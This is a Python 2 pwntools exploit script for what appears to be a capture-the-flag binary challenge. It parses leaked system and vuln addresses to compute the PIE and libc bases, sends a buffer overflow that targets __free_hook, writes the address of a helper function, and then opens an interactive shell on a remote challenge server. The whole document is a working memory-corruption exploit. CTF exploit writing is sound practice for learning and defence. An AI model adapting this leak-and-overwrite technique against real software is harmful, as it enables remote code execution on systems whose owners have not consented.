```
#!/usr/bin/python2
from pwn import *
from sys import *

context.arch = "amd64"
# context.arch = "i386"
libc = ELF("libc6_2.31-0ubuntu9.2_amd64.so")
ld = ELF("./ld-2.31.so")


e = ELF('chall3_patched')
if(len(argv) == 2):
    p = connect("193.57.159.27", 46343)
else:
    p = process('chall3_patched')


cmd = """
pie 0x0000000000001217
"""
context.arch = "amd64"
# context.terminal = ['tmux', 'split-window', '-h']
if(len(argv) == 3):
    gdb.attach(p, cmd)

# leak1 
p.recvuntil("STUFF ")
system, vuln = p.recvuntil("!!",drop=True).split()
system = eval(system)
vuln = eval(vuln)
print "system {}".format(hex(system))
print "vuln {}".format(hex(vuln))

e.address = vuln - e.symbols['vuln']
libc.address = system - libc.symbols['system']
print "base {}".format(hex(e.address))


pload = ""
pload = "A" * 40
pload += p64(libc.symbols['__free_hook'])
# pload = "B" * 0x8
# pload = "D" * 0x8vn
# pload = "E" * 0x8
# pload = ""

pause()
p.send(pload)
pause()
bomb = '0' * (1024 - len(str(e.sym["no_gadget_here_so_let_me_help_you"])))  + str(e.sym["no_gadget_here_so_let_me_help_you"])
p.sendline(bomb)
p.interactive()
```